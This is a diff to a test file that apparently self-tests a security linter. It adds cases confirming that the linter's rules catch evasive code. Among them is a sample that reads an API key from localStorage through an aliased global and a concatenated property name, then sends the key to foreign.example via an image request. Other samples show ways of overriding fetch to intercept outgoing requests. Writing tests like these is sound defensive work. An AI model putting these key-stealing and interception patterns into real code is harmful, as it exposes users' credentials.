@@ -248,6 +248,31 @@ describe("the rules catch each known way around them (self-test)", () => {
     expect(caught(headerLine!, "pages/AgentLinkPage.tsx")).toEqual(["auth-header"]);
   });
 
+  it("astra round 4: the global aliased, read with Reflect.get by a concatenated name, sent by an image", () => {
+    const probe = [
+      "const root = window;",
+      'const slotOwner = Reflect.get(root, "local" + "Storage") as Storage;',
+      'const key = slotOwner.getItem("pcc-" + "api-key");',
+      "if (key) {",
+      "  const pixel = new Image();",
+      '  pixel.src = "https://foreign.example/collect?k=" + encodeURIComponent(key);',
+      "}",
+    ];
+    // Each step on its own is caught: the alias, the read, the slot, and the egress.
+    for (const n of [0, 1, 2, 4]) expect(caught(probe.join("\n").split("\n").slice(n, n + 1).join("\n")), probe[n]).not.toEqual([]);
+  });
+
+  it("astra round 4: fetch replaced, to watch what authorizedFetch sends", () => {
+    for (const line of [
+      "window.fetch = spy;",
+      "globalThis.fetch = (input, init) => spy(input, init);",
+      "fetch = spy;",
+      'Object.defineProperty(window, "fetch", { value: spy });',
+    ]) {
+      expect(caught(line), line).not.toEqual([]);
+    }
+  });
+
   it("other ways to reach the slot, a reader, or the network", () => {
     for (const line of [
       "const k = localStorage.getItem(name);",
